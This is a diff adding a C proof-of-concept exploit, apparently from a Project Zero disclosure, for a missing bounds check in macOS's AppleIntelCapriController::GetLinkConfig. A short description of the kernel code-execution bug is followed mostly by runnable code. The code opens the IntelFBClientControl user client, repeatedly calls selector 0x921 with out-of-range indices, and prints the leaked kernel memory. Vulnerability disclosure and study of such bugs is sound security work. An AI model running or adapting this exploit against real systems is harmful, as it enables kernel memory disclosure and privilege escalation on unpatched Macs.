@@ -1,0 +1,102 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1071
+
+Selector 0x921 of IntelFBClientControl ends up in AppleIntelCapriController::GetLinkConfig
+
+This method takes a structure input and output buffer. It reads an attacker controlled dword from the input buffer which it
+uses to index an array of pointers with no bounds checking:
+
+This pointer is passed to AppleIntelFramebuffer::validateDisplayMode and the uint64 at offset +2130h is used as a C++ object pointer
+on which a virtual method is called. With some heap grooming this could be used to get kernel code execution.
+
+tested on MacOS Sierra 10.12.2 (16C67)
+*/
+
+// ianbeer
+
+// build: clang -o capri_exec capri_exec.c -framework IOKit
+
+#if 0
+MacOS kernel code execution due to lack of bounds checking in AppleIntelCapriController::GetLinkConfig
+
+Selector 0x921 of IntelFBClientControl ends up in AppleIntelCapriController::GetLinkConfig
+
+This method takes a structure input and output buffer. It reads an attacker controlled dword from the input buffer which it
+uses to index an array of pointers with no bounds checking:
+
+This pointer is passed to AppleIntelFramebuffer::validateDisplayMode and the uint64 at offset +2130h is used as a C++ object pointer
+on which a virtual method is called. With some heap grooming this could be used to get kernel code execution.
+
+tested on MacOS Sierra 10.12.2 (16C67)
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <mach/mach_error.h>
+
+#include <IOKit/IOKitLib.h>
+
+int main(int argc, char** argv){
+  kern_return_t err;
+
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IntelFBClientControl"));
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+
+  io_connect_t conn = MACH_PORT_NULL;
+  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
+  if (err != KERN_SUCCESS){
+    printf("unable to get user client connection\n");
+    return 0;
+  }
+
+  uint64_t inputScalar[16];  
+  uint64_t inputScalarCnt = 0;
+
+  char inputStruct[4096];
+  size_t inputStructCnt = 4096;
+
+  uint64_t outputScalar[16];
+  uint32_t outputScalarCnt = 0;
+
+  char outputStruct[4096];
+  size_t outputStructCnt = 0x1d8;
+
+  for (int step = 1; step < 1000; step++) {
+    memset(inputStruct, 0, inputStructCnt);
+    *(uint32_t*)inputStruct = 0x238 + (step*(0x2000/8));
+
+    outputStructCnt = 4096;
+    memset(outputStruct, 0, outputStructCnt);
+    
+    err = IOConnectCallMethod(
+      conn,
+      0x921,
+      inputScalar,
+      inputScalarCnt,
+      inputStruct,
+      inputStructCnt,
+      outputScalar,
+      &outputScalarCnt,
+      outputStruct,
+      &outputStructCnt); 
+
+    if (err == KERN_SUCCESS) {
+      break;
+    }
+
+    printf("retrying 0x2000 up - %s\n", mach_error_string(err));
+  }
+
+  uint64_t* leaked = (uint64_t*)(outputStruct+3);
+  for (int i = 0; i < 0x1d8/8; i++) {
+    printf("%016llx\n", leaked[i]);
+  }
+
+  return 0;
+}
